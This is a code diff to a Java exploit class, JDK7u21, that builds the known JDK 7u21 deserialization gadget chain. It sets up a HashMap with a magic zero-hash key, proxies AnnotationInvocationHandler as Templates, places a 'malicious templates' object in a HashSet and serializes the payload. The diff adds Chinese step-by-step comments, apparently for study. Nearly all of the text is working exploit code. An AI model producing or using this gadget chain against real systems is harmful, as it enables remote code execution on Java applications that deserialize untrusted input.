@@ -15,6 +15,7 @@ import java.lang.reflect.Field;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Proxy;
 import java.util.HashMap;
+import java.util.HashSet;
 import java.util.LinkedHashSet;
 import java.util.Map;
 
@@ -29,24 +30,25 @@ public class JDK7u21 {
 
         String zeroHashCodeStr = "f5a5a608";
 
+        // 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值
         HashMap map = new HashMap();
         map.put(zeroHashCodeStr, "foo");
 
+        // 实例化AnnotationInvocationHandler类
         Constructor handlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
         handlerConstructor.setAccessible(true);
-        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Override.class, map);
+        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);
 
-        setFieldValue(tempHandler, "type", Templates.class);
+        // 为tempHandler创造一层代理
         Templates proxy = (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), new Class[]{Templates.class}, tempHandler);
 
-        LinkedHashSet set = new LinkedHashSet(); // maintain order
+        // 实例化HashSet，并将两个对象放进去
+        HashSet set = new HashSet(); // maintain order
         set.add(templates);
         set.add(proxy);
 
-        setFieldValue(templates, "_auxClasses", null);
-        setFieldValue(templates, "_class", null);
-
-        map.put(zeroHashCodeStr, templates); // swap in real object
+        // 将恶意templates设置到map中
+        map.put(zeroHashCodeStr, templates);
 
         ByteArrayOutputStream barr = new ByteArrayOutputStream();
         ObjectOutputStream oos = new ObjectOutputStream(barr);
